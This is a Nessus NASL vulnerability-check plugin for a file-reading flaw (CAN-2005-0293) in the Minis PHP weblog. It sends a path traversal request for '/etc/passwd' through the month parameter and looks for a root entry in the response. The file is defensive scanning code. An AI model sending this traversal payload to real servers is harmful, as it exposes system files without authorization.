#
# (C) Tenable Network Security
#
if(description)
{
 script_id(16179);
 script_cve_id("CAN-2005-0293");
 script_bugtraq_id(12279); 
 script_version("$Revision: 1.2 $");
 name["english"] = "Minis Remote File Access";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running Minis, a weblogging system written in PHP.

The remote version of this software is vulnerable to a vulnerability
which may allow an attacker to read arbitary files on the remote host with
the privileges of the httpd user.

Solution : Upgrade to the newest version of this software
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for a file reading flaw in minis";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir ( cgi_dirs() )
{
 req = http_get(port:port, item:dir + "/minis.php?month=../../../../../../etc/passwd");
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if ( egrep(pattern:"root:.*:0:[01]:.*:.*:", string:res) )
 {
	 security_hole(port);
	 exit(0);
 }
}
